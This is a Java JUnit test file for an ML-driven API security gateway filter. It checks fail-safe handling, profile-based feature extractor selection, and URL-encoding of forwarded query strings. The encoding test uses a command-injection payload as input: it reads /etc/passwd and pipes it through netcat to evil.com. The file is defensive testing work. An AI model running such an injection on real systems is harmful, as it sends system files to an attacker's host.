package com.apisecurity.gateway.filter;

import com.apisecurity.gateway.auth.VerifiedIdentityResolver;
import com.apisecurity.gateway.decision.DecisionEngine;
import com.apisecurity.gateway.events.TelemetryService;
import com.apisecurity.gateway.features.BolaSessionTracker;
import com.apisecurity.gateway.features.FeatureExtractor;
import com.apisecurity.gateway.ml.MlServiceClient;
import com.apisecurity.gateway.policy.ReviewRequestGuard;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import org.mockito.ArgumentCaptor;

public class MlUnavailableGatewayTest {

    private FeatureExtractor featureExtractor;
    private MlServiceClient mlServiceClient;
    private RestTemplate restTemplate;
    private SecurityGatewayFilter filter;

    @BeforeEach
    public void setup() {
        featureExtractor = mock(FeatureExtractor.class);
        mlServiceClient = mock(MlServiceClient.class);
        restTemplate = mock(RestTemplate.class);
        DecisionEngine decisionEngine = new DecisionEngine();
        ReflectionTestUtils.setField(decisionEngine, "defaultConfidenceThreshold", 0.70);
        ReflectionTestUtils.setField(decisionEngine, "failSafeMode", "ALERT");
        filter = new SecurityGatewayFilter(
                featureExtractor,
                mock(BolaSessionTracker.class),
                mlServiceClient,
                decisionEngine,
                mock(TelemetryService.class),
                restTemplate,
                mock(VerifiedIdentityResolver.class),
                new ReviewRequestGuard()
        );
        ReflectionTestUtils.setField(filter, "demoApiUrl", "http://localhost:5001");
        ReflectionTestUtils.setField(filter, "atrdfProfile", "production");
    }

    @Test
    public void mlUnavailablePreservesBackendAuthorization() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/profile");
        request.setContent(new byte[0]);
        MockHttpServletResponse response = new MockHttpServletResponse();
        when(featureExtractor.extractAtrdfFeatures(any(), any())).thenReturn(new HashMap<>());
        Map<String, Object> unavailable = new HashMap<>();
        unavailable.put("error", "ML prediction unavailable");
        unavailable.put("decision", "ALERT");
        when(mlServiceClient.predict(anyString(), anyString(), any(), eq("production"))).thenReturn(unavailable);
        HttpClientErrorException unauthorized = HttpClientErrorException.create(
                HttpStatus.UNAUTHORIZED,
                "Unauthorized",
                HttpHeaders.EMPTY,
                "{\"error\":\"authentication required\"}".getBytes(StandardCharsets.UTF_8),
                StandardCharsets.UTF_8
        );
        when(restTemplate.exchange(any(), any(), any(), eq(byte[].class))).thenThrow(unauthorized);

        filter.doFilter(request, response, (servletRequest, servletResponse) -> {
            throw new AssertionError("gateway must not skip itself when ML is unavailable");
        });

        assertEquals(401, response.getStatus());
        assertNull(response.getHeader("X-Security-Decision"));
        verify(featureExtractor, never()).extractAtrdfExperimentalFeatures(any(), any());
    }

    @Test
    public void productionProfileDoesNotSelectExperimentalExtractor() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/books");
        request.setContent(new byte[0]);
        MockHttpServletResponse response = new MockHttpServletResponse();
        when(featureExtractor.extractAtrdfFeatures(any(), any())).thenReturn(new HashMap<>());
        Map<String, Object> allow = new HashMap<>();
        allow.put("decision", "ALLOW");
        allow.put("attack_family", "BENIGN");
        allow.put("predicted_class", "BENIGN");
        allow.put("confidence", 0.9);
        when(mlServiceClient.predict(anyString(), anyString(), any(), eq("production"))).thenReturn(allow);
        when(restTemplate.exchange(any(), any(), any(), eq(byte[].class)))
                .thenReturn(ResponseEntity.ok("ok".getBytes(StandardCharsets.UTF_8)));

        filter.doFilter(request, response, (servletRequest, servletResponse) -> {
            throw new AssertionError("request is handled by the gateway");
        });

        verify(featureExtractor).extractAtrdfFeatures(any(), any());
        verify(featureExtractor, never()).extractAtrdfExperimentalFeatures(any(), any());
        verify(mlServiceClient).predict(anyString(), anyString(), any(), eq("production"));
        assertEquals(200, response.getStatus());
    }

    @Test
    public void experimentalProfileSelectsTheFourteenFeatureExtractor() throws Exception {
        ReflectionTestUtils.setField(filter, "atrdfProfile", "experimental-jndi");
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/books");
        request.setContent(new byte[0]);
        MockHttpServletResponse response = new MockHttpServletResponse();
        when(featureExtractor.extractAtrdfExperimentalFeatures(any(), any())).thenReturn(new HashMap<>());
        Map<String, Object> allow = new HashMap<>();
        allow.put("decision", "ALLOW");
        allow.put("predicted_class", "BENIGN");
        allow.put("confidence", 0.9);
        when(mlServiceClient.predict(anyString(), anyString(), any(), eq("experimental-jndi"))).thenReturn(allow);
        when(restTemplate.exchange(any(), any(), any(), eq(byte[].class)))
                .thenReturn(ResponseEntity.ok("ok".getBytes(StandardCharsets.UTF_8)));

        filter.doFilter(request, response, (servletRequest, servletResponse) -> {
            throw new AssertionError("request is handled by the gateway");
        });

        verify(featureExtractor).extractAtrdfExperimentalFeatures(any(), any());
        verify(featureExtractor, never()).extractAtrdfFeatures(any(), any());
        verify(mlServiceClient).predict(anyString(), anyString(), any(), eq("experimental-jndi"));
    }

    @Test
    public void searchQueryEncodesReservedCharactersBeforeForwarding() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/books");
        request.setParameter("search", "; cat /etc/passwd | nc evil.com 4444");
        request.setContent(new byte[0]);
        MockHttpServletResponse response = new MockHttpServletResponse();
        when(featureExtractor.extractAtrdfFeatures(any(), any())).thenReturn(new HashMap<>());
        Map<String, Object> allow = new HashMap<>();
        allow.put("decision", "ALLOW");
        allow.put("attack_family", "BENIGN");
        allow.put("predicted_class", "BENIGN");
        allow.put("confidence", 0.9);
        when(mlServiceClient.predict(anyString(), anyString(), any(), eq("production"))).thenReturn(allow);
        when(restTemplate.exchange(any(), any(), any(), eq(byte[].class)))
                .thenReturn(ResponseEntity.ok("{\"books\":[],\"total\":0}".getBytes(StandardCharsets.UTF_8)));

        filter.doFilter(request, response, (servletRequest, servletResponse) -> {
            throw new AssertionError("request is handled by the gateway");
        });

        ArgumentCaptor<URI> uriCaptor = ArgumentCaptor.forClass(URI.class);
        verify(restTemplate).exchange(uriCaptor.capture(), any(), any(), eq(byte[].class));
        String forwarded = uriCaptor.getValue().toString();
        assertFalse(forwarded.contains("|"));
        assertTrue(forwarded.contains("%7C"));
        assertEquals(200, response.getStatus());
    }
}
